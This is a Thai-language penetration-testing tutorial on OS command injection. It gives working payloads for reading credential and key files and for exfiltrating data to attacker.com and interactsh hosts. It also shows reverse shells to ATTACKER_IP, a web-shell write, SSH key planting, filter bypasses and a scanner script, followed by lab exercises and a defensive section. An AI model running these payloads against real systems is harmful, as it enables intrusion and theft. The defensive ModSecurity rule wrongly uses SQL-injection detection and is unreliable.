# Part 30: Command Injection (การแทรกคำสั่ง OS)

## สารบัญ
1. [ทำความเข้าใจ Command Injection](#1-ทำความเข้าใจ-command-injection)
2. [OS Command Injection พื้นฐาน](#2-os-command-injection-พื้นฐาน)
3. [Blind Command Injection](#3-blind-command-injection)
4. [เทคนิค Bypass Filters](#4-เทคนิค-bypass-filters)
5. [Command Injection ใน Different Contexts](#5-command-injection-ใน-different-contexts)
6. [เครื่องมือทดสอบ Command Injection](#6-เครื่องมือทดสอบ-command-injection)
7. [Out-of-Band Command Injection](#7-out-of-band-command-injection)
8. [แบบฝึกหัด Lab](#8-แบบฝึกหัด-lab)
9. [การป้องกัน Command Injection](#9-การป้องกัน-command-injection)
10. [สรุป](#10-สรุป)

---

## 1. ทำความเข้าใจ Command Injection

### Command Injection คืออะไร?

Command Injection คือช่องโหว่ที่ผู้โจมตีสามารถส่งคำสั่ง OS เพิ่มเติมผ่าน input ของแอปพลิเคชัน ทำให้ระบบรันคำสั่งที่ไม่ได้ตั้งใจ

```
┌──────────────────────────────────────────────────────────────┐
│                    Command Injection Flow                     │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  User Input: "127.0.0.1; cat /etc/passwd"                   │
│       ↓                                                      │
│  Application Code:                                           │
│  system("ping -c 1 " + user_input)                          │
│       ↓                                                      │
│  Executed Command:                                           │
│  ping -c 1 127.0.0.1; cat /etc/passwd                       │
│       ↓                                                      │
│  Output: ping result + /etc/passwd contents                  │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### ประเภทของ Command Injection

| ประเภท | คำอธิบาย | ตัวอย่าง |
|--------|---------|----------|
| Classic | เห็น output ทันที | `; whoami` |
| Blind | ไม่เห็น output โดยตรง | Time delay, DNS lookup |
| Out-of-Band | ส่ง output ผ่าน channel อื่น | HTTP request, DNS query |

### Command Separators ที่ใช้บ่อย

```bash
# Linux/Unix
;    # รันคำสั่งถัดไปเสมอ (semicolon)
&&   # รันคำสั่งถัดไปถ้าคำสั่งแรกสำเร็จ
||   # รันคำสั่งถัดไปถ้าคำสั่งแรกล้มเหลว
|    # pipe output ไปคำสั่งถัดไป
`    # backtick - command substitution
$()  # command substitution
\n   # newline

# Windows
;    # semicolon
&    # run next command
&&   # run if previous succeeded
||   # run if previous failed
|    # pipe
\n   # newline
```

---

## 2. OS Command Injection พื้นฐาน

### ตัวอย่าง Vulnerable PHP Code

```php
<?php
// vulnerable_ping.php - ตัวอย่างโค้ดที่มีช่องโหว่
$host = $_GET['host'];
$output = shell_exec("ping -c 4 " . $host);  // ไม่มีการ sanitize!
echo "<pre>$output</pre>";
?>
```

### Basic Injection Payloads

```bash
# ============================================
# วิธีที่ 1: Semicolon separation
# ============================================
# URL: http://target.com/ping.php?host=127.0.0.1;whoami
curl "http://target.com/ping.php?host=127.0.0.1%3Bwhoami"
# Expected Output: (ping result)\nwww-data

# ============================================
# วิธีที่ 2: Ampersand separation
# ============================================
curl "http://target.com/ping.php?host=127.0.0.1%26whoami"
# 127.0.0.1&whoami

# ============================================
# วิธีที่ 3: Pipe
# ============================================
curl "http://target.com/ping.php?host=127.0.0.1%7Cwhoami"
# 127.0.0.1|whoami

# ============================================
# วิธีที่ 4: Double ampersand
# ============================================
curl "http://target.com/ping.php?host=127.0.0.1%26%26whoami"
# 127.0.0.1&&whoami

# ============================================
# วิธีที่ 5: OR operator  
# ============================================
curl "http://target.com/ping.php?host=invalidhost%7C%7Cwhoami"
# invalidhost||whoami (คำสั่งแรกล้มเหลว รันคำสั่งที่สอง)
```

### ตรวจสอบ Environment

```bash
# หา web server info
curl "http://target.com/ping.php?host=127.0.0.1;id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl "http://target.com/ping.php?host=127.0.0.1;uname+-a"
# Linux webserver 5.10.0 #1 SMP x86_64 GNU/Linux

curl "http://target.com/ping.php?host=127.0.0.1;pwd"
# /var/www/html

curl "http://target.com/ping.php?host=127.0.0.1;ls+-la"
# drwxr-xr-x 2 www-data www-data 4096 ...
# -rw-r--r-- 1 www-data www-data  512 ... ping.php

curl "http://target.com/ping.php?host=127.0.0.1;cat+/etc/passwd"
# root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# ...

curl "http://target.com/ping.php?host=127.0.0.1;env"
# PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
# APACHE_RUN_USER=www-data
# DOCUMENT_ROOT=/var/www/html
# ...
```

### อ่าน Sensitive Files

```bash
# ============================================
# อ่านไฟล์สำคัญบนระบบ
# ============================================

# /etc/passwd - รายชื่อ users
curl "http://target.com/ping.php?host=;cat+/etc/passwd"

# /etc/shadow - password hashes (ต้องการ root)
curl "http://target.com/ping.php?host=;cat+/etc/shadow"

# web config files
curl "http://target.com/ping.php?host=;cat+/var/www/html/config.php"
curl "http://target.com/ping.php?host=;find+/var/www+-name+'*.php'+-type+f"

# SSH keys
curl "http://target.com/ping.php?host=;cat+/home/user/.ssh/id_rsa"
curl "http://target.com/ping.php?host=;ls+-la+/root/.ssh/"

# Cron jobs
curl "http://target.com/ping.php?host=;crontab+-l"
curl "http://target.com/ping.php?host=;cat+/etc/crontab"

# Process list
curl "http://target.com/ping.php?host=;ps+aux"

# Network info
curl "http://target.com/ping.php?host=;ifconfig"
curl "http://target.com/ping.php?host=;netstat+-anltp"
curl "http://target.com/ping.php?host=;ss+-tulnp"
```

---

## 3. Blind Command Injection

### Time-Based Blind Injection

```bash
# ============================================
# วิธีที่ 1: sleep command
# ============================================
# ถ้า response ช้า = มีช่องโหว่

# Linux
time curl "http://target.com/ping.php?host=127.0.0.1%3Bsleep+5"
# real    0m5.234s  <- ใช้เวลา 5 วินาที = vulnerable!

# Windows
time curl "http://target.com/ping.php?host=127.0.0.1%26ping+-n+5+127.0.0.1"

# ============================================
# Confirm ด้วย different sleep times
# ============================================

# 3 วินาที
time curl "http://target.com/ping.php?host=;sleep+3" 2>&1 | grep real
# real    0m3.xxx

# 10 วินาที
time curl "http://target.com/ping.php?host=;sleep+10" 2>&1 | grep real  
# real    0m10.xxx
```

### Exfiltrate Data ผ่าน DNS

```bash
# ============================================
# ใช้ DNS lookup เพื่อ exfiltrate data
# ============================================
# ต้องมี DNS server ของตัวเอง หรือใช้ Burp Collaborator / interactsh

# ติดตั้ง interactsh-client
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# รัน interactsh server
interactsh-client
# [INF] Listing on interactsh.com
# [INF] URL: xxxxxxxx.interactsh.com  <- copy URL นี้

# ============================================
# Payload สำหรับ DNS exfiltration
# ============================================

# ส่ง hostname ผ่าน DNS
curl "http://target.com/ping.php?host=;nslookup+\$(hostname).xxxxxxxx.interactsh.com"

# ส่ง whoami ผ่าน DNS
curl "http://target.com/ping.php?host=;nslookup+\$(whoami).xxxxxxxx.interactsh.com"

# ส่ง content ของไฟล์ (encode ก่อน)
curl "http://target.com/ping.php?host=;nslookup+\$(cat+/etc/hostname|base64).xxxxxxxx.interactsh.com"

# ============================================
# ใช้ curl สำหรับ HTTP exfiltration
# ============================================
curl "http://target.com/ping.php?host=;curl+http://attacker.com/\$(whoami)"
curl "http://target.com/ping.php?host=;curl+http://attacker.com/?data=\$(id|base64)"
curl "http://target.com/ping.php?host=;wget+-O-+http://attacker.com/\$(hostname)"
```

### Blind Injection - Write Files

```bash
# ============================================
# เขียน web shell
# ============================================

# เขียน PHP web shell
curl "http://target.com/ping.php?host=;echo+'<?php+system(\$_GET[cmd]);?>'+>+/var/www/html/shell.php"

# ทดสอบ shell ที่เขียน
curl "http://target.com/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

# เขียน SSH authorized_keys
curl "http://target.com/ping.php?host=;mkdir+-p+/root/.ssh"
curl "http://target.com/ping.php?host=;echo+'ssh-rsa+AAAA...+attacker'+>+/root/.ssh/authorized_keys"
curl "http://target.com/ping.php?host=;chmod+600+/root/.ssh/authorized_keys"

# download script จาก attacker
curl "http://target.com/ping.php?host=;curl+http://attacker.com/script.sh+-o+/tmp/s.sh"
curl "http://target.com/ping.php?host=;bash+/tmp/s.sh"
```

---

## 4. เทคนิค Bypass Filters

### Bypass Blacklist Characters

```bash
# ============================================
# ถ้า semicolon ถูก block
# ============================================

# ใช้ newline แทน
curl "http://target.com/ping.php?host=127.0.0.1%0aid"
# %0a = newline character

# ใช้ pipe
curl "http://target.com/ping.php?host=127.0.0.1|id"

# ใช้ double pipe
curl "http://target.com/ping.php?host=invalid||id"

# ============================================
# Bypass ด้วย command substitution
# ============================================

# backtick
curl "http://target.com/ping.php?host=127.0.0.1;\`id\`"

# $() syntax
curl "http://target.com/ping.php?host=127.0.0.1;\$(id)"

# ============================================
# Bypass space filters
# ============================================

# ถ้า space ถูก block
# ใช้ ${IFS} แทน space
curl "http://target.com/ping.php?host=;cat${IFS}/etc/passwd"

# ใช้ tab (URL encode: %09)
curl "http://target.com/ping.php?host=;cat%09/etc/passwd"

# ใช้ $'\t'
curl "http://target.com/ping.php?host=;cat$'\t'/etc/passwd"

# ใช้ {,} brace expansion
curl "http://target.com/ping.php?host=;{cat,/etc/passwd}"

# ============================================
# Bypass keyword filters
# ============================================

# ถ้า 'cat' ถูก block
# ใช้ head
curl "http://target.com/ping.php?host=;head${IFS}/etc/passwd"

# ใช้ tac (reverse cat)
curl "http://target.com/ping.php?host=;tac${IFS}/etc/passwd"

# ใช้ less/more
curl "http://target.com/ping.php?host=;less${IFS}/etc/passwd"

# ใช้ string concatenation
curl "http://target.com/ping.php?host=;ca'+'t${IFS}/etc/passwd"
curl "http://target.com/ping.php?host=;c\at${IFS}/etc/passwd"

# variable substitution
curl "http://target.com/ping.php?host=;c=at;ca\$c${IFS}/etc/passwd"
```

### Bypass Slash Filters

```bash
# ============================================
# ถ้า forward slash ถูก block
# ============================================

# ใช้ ${PATH:0:1} เพื่อได้ /
# echo ${PATH:0:1} => /
curl "http://target.com/ping.php?host=;cat${IFS}\${PATH:0:1}etc\${PATH:0:1}passwd"

# ใช้ Home directory variable
# echo ${HOME} => /root
curl "http://target.com/ping.php?host=;ls${IFS}\${HOME}"

# ใช้ $BASH environment variable
# /bin/bash -> ใช้เพื่อ extract /

# find path ด้วย find command
curl "http://target.com/ping.php?host=;find${IFS}.${IFS}-name${IFS}ping"
```

### Bypass Alphanumeric Filters

```bash
# ============================================
# ถ้าอนุญาตเฉพาะ alphanumeric
# ============================================

# ใช้ hex encoding
# whoami = \x77\x68\x6f\x61\x6d\x69
curl "http://target.com/ping.php?host=;\$'\x77\x68\x6f\x61\x6d\x69'"

# ใช้ octal
# cat = \143\141\164
curl "http://target.com/ping.php?host=;\$'\143\141\164'${IFS}\${PATH:0:1}etc\${PATH:0:1}passwd"

# Base64 encoding
# echo 'id' | base64 => aWQ=
curl "http://target.com/ping.php?host=;echo${IFS}aWQ=|base64${IFS}-d|sh"

# หรือ
curl "http://target.com/ping.php?host=;\$(echo${IFS}aWQ=|base64${IFS}-d)"
```

---

## 5. Command Injection ใน Different Contexts

### Node.js / Express

```javascript
// vulnerable_node.js - โค้ดที่มีช่องโหว่
const express = require('express');
const { exec } = require('child_process');
const app = express();

app.get('/ping', (req, res) => {
    const host = req.query.host;
    exec(`ping -c 4 ${host}`, (error, stdout, stderr) => {  // vulnerable!
        res.send(stdout);
    });
});
```

```bash
# ทดสอบ Node.js injection
curl "http://target.com:3000/ping?host=127.0.0.1;id"
curl "http://target.com:3000/ping?host=127.0.0.1%3Bid%3Bwhoami"
```

### Python Flask

```python
# vulnerable_flask.py - โค้ดที่มีช่องโหว่
from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/ping')
def ping():
    host = request.args.get('host')
    result = subprocess.check_output(f'ping -c 4 {host}', shell=True)  # vulnerable!
    return result
```

```bash
# ทดสอบ Python injection
curl "http://target.com:5000/ping?host=127.0.0.1;id"
curl "http://target.com:5000/ping?host=127.0.0.1;cat+/etc/passwd"
```

### ผ่าน HTTP Headers

```bash
# บางแอปพลิเคชันนำ header values ไปใช้ใน shell commands

# User-Agent injection
curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1" \
     http://target.com/cgi-bin/script.sh
# (ShellShock vulnerability)

# X-Forwarded-For injection (ถ้า app log ด้วย shell command)
curl -H "X-Forwarded-For: 127.0.0.1; id" http://target.com/page

# Referer injection
curl -H "Referer: http://example.com\"; id; echo \"" http://target.com/log.php
```

### ผ่าน File Names

```bash
# ถ้าแอปพลิเคชันรัน shell command กับชื่อไฟล์ที่ upload

# สร้างไฟล์ที่มีชื่อเป็น payload
touch $'; id > /tmp/pwned'
touch $'$(id > /tmp/pwned)'
touch "|id > /tmp/pwned"

# ตรวจสอบผล
curl "http://target.com/ping.php?host=;cat+/tmp/pwned"
```

---

## 6. เครื่องมือทดสอบ Command Injection

### Commix

```bash
# ============================================
# Commix - Automated Command Injection
# ============================================

# ติดตั้ง
sudo apt install commix -y
# หรือ
git clone https://github.com/commixproject/commix.git

# Basic scan
commix --url="http://target.com/ping.php?host=127.0.0.1"

# ระบุ parameter
commix --url="http://target.com/ping.php" \
       --data="host=127.0.0.1"

# POST request
commix --url="http://target.com/ping.php" \
       --data="host=127.0.0.1" \
       --method=POST

# ใช้ cookie (authenticated)
commix --url="http://target.com/ping.php?host=127.0.0.1" \
       --cookie="PHPSESSID=abc123"

# Specify injection level
commix --url="http://target.com/ping.php?host=127.0.0.1" \
       --level=3

# Get reverse shell
commix --url="http://target.com/ping.php?host=127.0.0.1" \
       --os-shell

# ตั้ง OS type
commix --url="http://target.com/ping.php?host=127.0.0.1" \
       --os=unix

# Bypass filter
commix --url="http://target.com/ping.php?host=127.0.0.1" \
       --technique=T  # Time-based

# Output format
commix --url="http://target.com/ping.php?host=127.0.0.1" \
       --output-dir=/tmp/commix_output
```

### Burp Suite Intruder สำหรับ Command Injection

```
1. จับ request ด้วย Burp Proxy
2. ส่งไปที่ Intruder
3. เลือก parameter ที่ต้องการทดสอบ
4. ใช้ payload list:

Payloads สำหรับ Burp Intruder:
;id
;whoami
;uname -a
;cat /etc/passwd
&&id
&&whoami
||id
|id
`id`
$(id)
;sleep 5
&&sleep 5
||sleep 5
|sleep 5
`sleep 5`
$(sleep 5)
;ping -c 5 127.0.0.1

5. ดู response time สำหรับ time-based
6. ดู response length สำหรับ output-based
```

### Custom Python Scanner

```python
#!/usr/bin/env python3
# command_injection_scanner.py

import requests
import time
import urllib.parse
from colorama import Fore, Style, init

init()

class CommandInjectionScanner:
    def __init__(self, target_url, param_name):
        self.target_url = target_url
        self.param_name = param_name
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0)'
        })
        
        # Payloads สำหรับทดสอบ
        self.time_payloads = [
            ';sleep 5',
            '&&sleep 5',
            '||sleep 5',
            '|sleep 5',
            '`sleep 5`',
            '$(sleep 5)',
            ';ping -c 5 127.0.0.1',
            ';timeout 5',
        ]
        
        self.output_payloads = [
            ';id',
            '&&id',
            '||id',
            '|id',
            '`id`',
            '$(id)',
            ';whoami',
            ';uname -a',
        ]
    
    def get_baseline(self):
        """หา baseline response time"""
        times = []
        for _ in range(3):
            start = time.time()
            try:
                r = self.session.get(self.target_url, 
                                    params={self.param_name: '127.0.0.1'},
                                    timeout=30)
                times.append(time.time() - start)
            except:
                times.append(0)
        return sum(times) / len(times)
    
    def test_time_based(self, baseline):
        """ทดสอบ time-based injection"""
        print(f"\n{Fore.CYAN}[*] Testing time-based injection...{Style.RESET_ALL}")
        
        for payload in self.time_payloads:
            test_value = f"127.0.0.1{payload}"
            start = time.time()
            try:
                r = self.session.get(self.target_url,
                                    params={self.param_name: test_value},
                                    timeout=30)
                elapsed = time.time() - start
                
                # ถ้า response ช้ากว่า baseline มากกว่า 4 วินาที = vulnerable
                if elapsed > (baseline + 4):
                    print(f"{Fore.RED}[VULNERABLE] Time-based: {payload}{Style.RESET_ALL}")
                    print(f"  Baseline: {baseline:.2f}s, With payload: {elapsed:.2f}s")
                    return True, payload
                else:
                    print(f"{Fore.GREEN}[OK] {payload}: {elapsed:.2f}s{Style.RESET_ALL}")
            except requests.exceptions.Timeout:
                print(f"{Fore.RED}[VULNERABLE] Timeout with: {payload}{Style.RESET_ALL}")
                return True, payload
        
        return False, None
    
    def test_output_based(self):
        """ทดสอบ output-based injection"""
        print(f"\n{Fore.CYAN}[*] Testing output-based injection...{Style.RESET_ALL}")
        
        # เครื่องหมายที่บ่งบอกว่า command รัน
        indicators = ['uid=', 'www-data', 'root', 'linux', 'GNU', 'bin/bash']
        
        for payload in self.output_payloads:
            test_value = f"127.0.0.1{payload}"
            try:
                r = self.session.get(self.target_url,
                                    params={self.param_name: test_value},
                                    timeout=10)
                
                response_lower = r.text.lower()
                for indicator in indicators:
                    if indicator.lower() in response_lower:
                        print(f"{Fore.RED}[VULNERABLE] Output-based: {payload}{Style.RESET_ALL}")
                        print(f"  Found: '{indicator}' in response")
                        # แสดง context
                        idx = response_lower.find(indicator.lower())
                        print(f"  Context: ...{r.text[max(0,idx-20):idx+50]}...")
                        return True, payload
                        
                print(f"{Fore.GREEN}[OK] {payload}: No indicators found{Style.RESET_ALL}")
            except Exception as e:
                print(f"[ERROR] {payload}: {e}")
        
        return False, None
    
    def exploit(self, payload_template, command):
        """รัน command ผ่าน injection"""
        payload = payload_template.replace('id', command)
        test_value = f"127.0.0.1{payload}"
        
        r = self.session.get(self.target_url,
                            params={self.param_name: test_value},
                            timeout=15)
        return r.text
    
    def scan(self):
        print(f"{Fore.YELLOW}[*] Scanning: {self.target_url}{Style.RESET_ALL}")
        print(f"[*] Parameter: {self.param_name}")
        
        # Get baseline
        print(f"\n[*] Getting baseline...")
        baseline = self.get_baseline()
        print(f"[*] Baseline response time: {baseline:.2f}s")
        
        # Test
        vuln_time, payload_time = self.test_time_based(baseline)
        vuln_output, payload_output = self.test_output_based()
        
        if vuln_time or vuln_output:
            print(f"\n{Fore.RED}{'='*60}{Style.RESET_ALL}")
            print(f"{Fore.RED}[!] COMMAND INJECTION VULNERABILITY FOUND!{Style.RESET_ALL}")
            if vuln_output:
                print(f"[*] Running 'id' command...")
                output = self.exploit(payload_output, 'id')
                # extract id output
                for line in output.split('\n'):
                    if 'uid=' in line:
                        print(f"[*] Result: {line.strip()}")
        else:
            print(f"\n{Fore.GREEN}[*] No obvious command injection found{Style.RESET_ALL}")


if __name__ == '__main__':
    import sys
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <url> <param>")
        print(f"Example: {sys.argv[0]} http://target.com/ping.php host")
        sys.exit(1)
    
    scanner = CommandInjectionScanner(sys.argv[1], sys.argv[2])
    scanner.scan()
```

---

## 7. Out-of-Band Command Injection

### DNS Exfiltration ด้วย interactsh

```bash
# ============================================
# ติดตั้งและใช้งาน interactsh
# ============================================

# ติดตั้ง
wget https://github.com/projectdiscovery/interactsh/releases/download/v1.1.7/interactsh-client_1.1.7_linux_amd64.zip
unzip interactsh-client_1.1.7_linux_amd64.zip
sudo mv interactsh-client /usr/local/bin/

# รัน client
interactsh-client -v
# [INF] Current interactsh version: v1.1.7
# [INF] Listing on interactsh.com
# [INF] URL: xxxxxxxxxx.oast.pro  <- บันทึก URL นี้

# ============================================
# ทดสอบด้วย DNS payload
# ============================================

# ใน terminal อื่น:
INTERACT_HOST="xxxxxxxxxx.oast.pro"

# DNS lookup
curl "http://target.com/ping.php?host=;nslookup+${INTERACT_HOST}"

# DNS with data
curl "http://target.com/ping.php?host=;nslookup+\$(whoami).${INTERACT_HOST}"

# ============================================
# HTTP callback
# ============================================

# ส่ง whoami ผ่าน HTTP
curl "http://target.com/ping.php?host=;curl+http://${INTERACT_HOST}/\$(whoami)"

# ส่ง file content (base64 encoded)
curl "http://target.com/ping.php?host=;curl+http://${INTERACT_HOST}/\$(cat+/etc/passwd|base64+-w0)"

# ใน interactsh terminal จะเห็น:
# [DNS] xxx.oast.pro from 1.2.3.4 at 2024-01-01 12:00:00
# [HTTP] GET /www-data HTTP/1.1 from 1.2.3.4 at 2024-01-01 12:00:01
```

### Reverse Shell ผ่าน Command Injection

```bash
# ============================================
# ตั้ง listener บน Kali
# ============================================
nc -lvnp 4444
# Listening on 0.0.0.0 4444

# ============================================
# Reverse shell payloads
# ============================================
ATTACKER_IP="192.168.1.100"
ATTACKER_PORT="4444"

# Bash reverse shell
curl "http://target.com/ping.php?host=;bash+-i+>%26+/dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT}+0>%261"

# Python reverse shell
curl "http://target.com/ping.php?host=;python3+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${ATTACKER_IP}\",${ATTACKER_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"

# Netcat reverse shell (ถ้ามี -e option)
curl "http://target.com/ping.php?host=;nc+${ATTACKER_IP}+${ATTACKER_PORT}+-e+/bin/bash"

# Netcat without -e (mkfifo)
curl "http://target.com/ping.php?host=;rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+${ATTACKER_IP}+${ATTACKER_PORT}+>/tmp/f"

# ============================================
# Upgrade shell
# ============================================
# เมื่อได้ shell แล้ว
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

---

## 8. แบบฝึกหัด Lab

### Lab 1: DVWA Command Injection

```bash
# ============================================
# ติดตั้ง DVWA
# ============================================

# ใช้ Docker (ง่ายที่สุด)
docker run --rm -d -p 80:80 vulnerables/web-dvwa

# หรือติดตั้งด้วยตัวเอง
sudo apt install apache2 php php-mysql mariadb-server -y
git clone https://github.com/digininja/DVWA /var/www/html/dvwa
cd /var/www/html/dvwa
cp config/config.inc.php.dist config/config.inc.php

# แก้ config
nano config/config.inc.php
# $_DVWA[ 'db_password' ] = 'p@ssw0rd';

# Setup database
sudo mysql -u root -p
# CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'p@ssw0rd';
# GRANT ALL ON dvwa.* TO 'dvwa'@'localhost';

# เข้า http://localhost/dvwa/setup.php -> Create/Reset Database

# ============================================
# ทดสอบ Command Injection ใน DVWA
# ============================================

# 1. เข้า http://localhost/dvwa/
# 2. Login: admin/password
# 3. Set security level = Low
# 4. ไปที่ Command Injection

# Low Security - ไม่มี filter
# Input: 127.0.0.1; cat /etc/passwd
# Input: 127.0.0.1 && id
# Input: 127.0.0.1 | ls /

# Medium Security - filter ; และ &&
# Bypass: 127.0.0.1|id
# Bypass: 127.0.0.1||id
# Bypass ด้วย newline: ใส่ 127.0.0.1%0aid ใน URL

# High Security - filter แบบ blacklist
# Bypass: 127.0.0.1;|id    <- ใส่ ; ก่อน | เพื่อ confuse blacklist
# หา logic ของ filter แล้ว bypass
```

### Lab 2: Metasploitable2

```bash
# ============================================
# Download Metasploitable2
# ============================================
# https://sourceforge.net/projects/metasploitable/

# Import ใน VMware/VirtualBox
# IP ของ Metasploitable: 192.168.1.X
META_IP="192.168.1.200"

# ============================================
# Exploit TWIKI Command Injection (CVE-2009-4898)
# ============================================

# TWiki มี command injection ใน search
curl "http://${META_IP}/twiki/bin/search/Main?scope=text&regex=on&search=a;id"

# ใน Metasploit
msfconsole
use exploit/unix/webapp/twiki_history
set RHOSTS ${META_IP}
set TARGETURI /twiki/bin/view/Main/WebHome
exploit
```

---

## 9. การป้องกัน Command Injection

### Secure Coding Practices

```php
<?php
// === VULNERABLE CODE ===
$host = $_GET['host'];
system("ping -c 4 " . $host);  // อันตราย!

// === SECURE CODE ===

// วิธีที่ 1: escapeshellarg() - wrap ใน quotes, escape special chars
$host = $_GET['host'];
$safe_host = escapeshellarg($host);
system("ping -c 4 " . $safe_host);

// วิธีที่ 2: Whitelist validation
$host = $_GET['host'];
if (!preg_match('/^[a-zA-Z0-9.\-]+$/', $host)) {
    die("Invalid hostname");
}
system("ping -c 4 " . escapeshellarg($host));

// วิธีที่ 3: ใช้ PHP functions แทน shell commands
$host = $_GET['host'];
// Validate IP address
if (!filter_var($host, FILTER_VALIDATE_IP) && 
    !filter_var($host, FILTER_VALIDATE_DOMAIN, FILTER_FLAG_HOSTNAME)) {
    die("Invalid input");
}
// Use exec array format (no shell)
exec('ping', ['-c', '4', $host], $output);
echo implode("\n", $output);
?>
```

```python
import subprocess
import re

# === VULNERABLE ===
def ping_host_vulnerable(host):
    import os
    os.system(f'ping -c 4 {host}')  # อันตราย!

# === SECURE ===
def ping_host_secure(host):
    # Whitelist validation
    if not re.match(r'^[a-zA-Z0-9.\-]+$', host):
        raise ValueError("Invalid hostname")
    
    # ใช้ list format (ไม่ผ่าน shell)
    result = subprocess.run(
        ['ping', '-c', '4', host],  # list format = no shell injection
        capture_output=True,
        text=True,
        shell=False,  # สำคัญมาก!
        timeout=30
    )
    return result.stdout

# === SECURE NODE.JS ===
# const { execFile } = require('child_process');
# execFile('ping', ['-c', '4', host], (error, stdout, stderr) => {
#     res.send(stdout);
# });
```

### Security Controls

```bash
# ============================================
# Web Application Firewall (WAF) Rules
# ============================================

# ModSecurity rules สำหรับ Command Injection
# /etc/modsecurity/rules/command-injection.conf

SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|\
        REQUEST_HEADERS|REQUEST_HEADERS_NAMES|ARGS|ARGS_NAMES \
    "@detectSQLi" \
    "id:932100,phase:2,block,t:none,log,msg:'Command Injection'"

# ============================================
# เพิ่ม Content Security Policy
# ============================================

# Apache
Header always set Content-Security-Policy "default-src 'self'"

# Nginx
add_header Content-Security-Policy "default-src 'self'";
```

---

## 10. สรุป

### Summary Table

| หัวข้อ | เนื้อหา |
|--------|--------|
| พื้นฐาน | Command separators (;, &&, \|\|, \|) |
| Blind Injection | Time-based (sleep), DNS/HTTP callback |
| Filter Bypass | IFS แทน space, base64 encoding, variable substitution |
| เครื่องมือ | commix, Burp Intruder, custom Python scanner |
| Out-of-Band | interactsh, DNS exfiltration, reverse shell |
| การป้องกัน | escapeshellarg(), whitelist validation, subprocess list format |

### Checklist

```
[ ] ทดสอบ input fields ทั้งหมดด้วย basic payloads (;id)
[ ] ทดสอบ HTTP headers (User-Agent, Referer, X-Forwarded-For)
[ ] ทดสอบ file upload filenames
[ ] ทดสอบ time-based blind injection
[ ] ทดสอบ out-of-band ด้วย interactsh
[ ] ใช้ commix สำหรับ automated scan
[ ] เตรียม reverse shell listener
[ ] Document findings ทั้งหมด
```

### Quick Reference

```bash
# Basic detection payloads
;id
&&id
||id
|id
`id`
$(id)

# Blind detection
;sleep 5
;ping -c 5 127.0.0.1

# Filter bypass
;cat${IFS}/etc/passwd    # space bypass
;c''at /etc/passwd       # keyword bypass
;echo aWQ=|base64 -d|sh  # base64 bypass

# Commix one-liner
commix --url="URL" --data="param=value" --os-shell

# Listener
nc -lvnp 4444
```

---

**ต่อไป**: [Part 31 - CSRF Cross-Site Request Forgery](Part-31-CSRF-Cross-Site-Request-Forgery.md)
